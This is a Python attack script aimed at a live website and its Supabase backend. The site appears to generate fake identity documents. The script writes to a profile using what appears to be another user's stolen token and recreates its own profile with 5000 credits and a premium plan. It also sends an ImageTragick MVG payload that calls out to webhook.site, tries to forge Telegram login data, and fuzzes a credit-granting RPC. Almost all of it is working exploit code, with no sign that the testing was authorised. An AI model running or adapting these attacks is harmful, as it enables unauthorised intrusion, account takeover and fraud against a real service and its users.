import ssl, json, urllib.request, urllib.error, uuid

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
B = "https://onlyfakeai.ru"
their = json.loads(open("their_token.txt", encoding="utf-8").read())
tok = their["access_token"]
uid = their["user"]["id"]

def req(method, url, body=None, token=None, extra=None, raw=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if extra:
        h.update(extra)
    data = raw
    if data is None and body is not None:
        h["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=45, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

print("=== A. set own secret_key then try secret-key auth on submit ===")
st, hd, raw = req("PATCH", f"{SUPA}/rest/v1/profiles?user_id=eq.{uid}",
                  body={"secret_key": "rat4080key1"}, token=tok,
                  extra={"apikey": KEY, "Prefer": "return=representation"})
print("set secret_key:", st, raw[:200])
minimal = {"country": "france", "documentType": "id_card",
           "firstName": "T", "lastName": "T", "photo": "test",
           "metadataEnabled": False}
st, hd, raw = req("POST", B + "/api/submit-photoshop-job", body=minimal,
                  extra={"X-Secret-Key": "rat4080key1", "x-api-key": "rat4080key1"})
print("submit with X-Secret-Key:", st, raw[:200])
st, hd, raw = req("POST", B + "/api/submit-photoshop-job", body=minimal,
                  extra={"Authorization": "Bearer rat4080key1"})
print("submit with secret as bearer:", st, raw[:200])

print("\n=== B. DELETE own profile then INSERT with generations (my probe acct) ===")
my = json.loads(open("token.txt", encoding="utf-8").read())
mtok = my["access_token"]
muid = my["user"]["id"]
st, hd, raw = req("DELETE", f"{SUPA}/rest/v1/profiles?user_id=eq.{muid}",
                  token=mtok, extra={"apikey": KEY})
print("DELETE own profile:", st, raw[:200])
st, hd, raw = req("POST", f"{SUPA}/rest/v1/profiles",
                  body={"user_id": muid, "email": "rat4080probeewb44z@gmail.com",
                        "generations_left": 5000, "activePlan": "ultimate",
                        "auto_delete_enabled": False, "auto_delete_days": 30},
                  token=mtok, extra={"apikey": KEY, "Prefer": "return=representation"})
print("INSERT with gens:", st, raw[:300])

print("\n=== C. ImageTragick MVG probe via remove-background ===")
mvg = (b'push graphic-context\nviewbox 0 0 640 480\n'
       b'fill "url(https://webhook.site/rat4080canary)"\npop graphic-context\n')
boundary = "----ratmvg"
body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
        f"filename=\"p.mvg\"\r\nContent-Type: image/x-mvg\r\n\r\n").encode() + mvg + f"\r\n--{boundary}--\r\n".encode()
h = {"User-Agent": "Mozilla/5.0",
     "Content-Type": f"multipart/form-data; boundary={boundary}"}
r = urllib.request.Request(B + "/api/remove-background", data=body, headers=h)
try:
    with urllib.request.urlopen(r, timeout=60, context=ctx) as resp:
        raw2 = resp.read()
        print("mvg ->", resp.status, resp.headers.get("Content-Type"), len(raw2), raw2[:200])
except urllib.error.HTTPError as e:
    print("mvg ->", e.code, e.read()[:250])

print("\n=== D. telegram webapp auth forgery retest ===")
tg_user = {"id": 100000001, "first_name": "Rat", "username": "rat4080",
           "language_code": "en", "is_bot": False}
for payload in [
    {"initData": "", "user": tg_user},
    {"initData": "user=%7B%22id%22%3A100000001%7D&auth_date=1794380000&hash=deadbeef", "user": tg_user},
    {"user": tg_user},
]:
    st, hd, raw = req("POST", B + "/api/auth/telegram-webapp", body=payload)
    print(json.dumps(payload)[:80], "->", st, raw[:250])

print("\n=== E. rpc single-param default execution fuzz ===")
names = ["p_user_id", "p_plan", "p_credits", "p_amount", "p_email",
         "target_user_id", "target_id", "plan", "credits", "user_id",
         "email", "plan_name", "p_plan_name", "p_generations",
         "generations", "p_days", "days", "p_expiry", "p_target_email",
         "p_admin_id", "p_requested_by", "p_actor", "p_profile_id",
         "profile_id", "p_new_plan", "p_credit_amount", "amount",
         "p_username", "username"]
for n in names:
    st, hd, raw = req("POST", f"{SUPA}/rest/v1/rpc/grant_plan_credits",
                      body={n: "probe"}, token=tok, extra={"apikey": KEY})
    if st != 404:
        print(f"grant_plan_credits({n}=probe) -> {st} <<<<<<<<", raw[:200])
